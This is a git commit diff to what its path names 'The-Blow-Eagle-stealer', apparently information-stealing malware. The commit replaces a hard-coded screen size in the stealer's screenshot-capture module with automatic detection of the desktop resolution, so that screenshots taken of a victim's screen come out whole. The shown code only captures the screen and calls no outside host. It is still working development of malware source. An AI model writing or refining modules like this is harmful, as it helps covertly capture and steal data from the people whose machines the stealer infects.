93779ae154602bc7541a38ea247a567c7f11cf63
Fabeni <39953296+Allespro@users.noreply.github.com>
2023-06-20 13:05:56 +0300

    Auto screen dimensions detect
    Fixed screen size detect. There was corrupted screenshot on small screen.

--- The-Blow-Eagle-stealer/targets/images/screenshot.cpp
+++ The-Blow-Eagle-stealer/targets/images/screenshot.cpp
@@ -27,7 +27,23 @@
 #include "../targets.h"
 #include "../../config/config.cpp"
 #include  "../../helper/helper.h"
+#include "wtypes.h"
 #include <tchar.h>
+
+void GetDesktopResolution(int& horizontal, int& vertical)
+{
+    RECT desktop;
+    // Get a handle to the desktop window
+    const HWND hDesktop = GetDesktopWindow();
+    // Get the size of screen to the variable desktop
+    GetWindowRect(hDesktop, &desktop);
+    // The top left corner will have coordinates (0,0)
+    // and the bottom right corner will have coordinates
+    // (horizontal, vertical)
+    horizontal = desktop.right;
+    vertical = desktop.bottom;
+}
+
 
 void images::Screenshot() 
 {
@@ -43,8 +59,9 @@ void images::Screenshot()
         int r = _mkdir(dir.c_str());
 
         // Get the screen dimensions
-        int screenWidth = 3840;
-        int screenHeight = 2160;
+        int screenWidth = 0;
+        int screenHeight = 0;
+        GetDesktopResolution(screenWidth, screenHeight);
 
         // Create a device context for the screen
         HDC screenDC = GetDC(NULL);
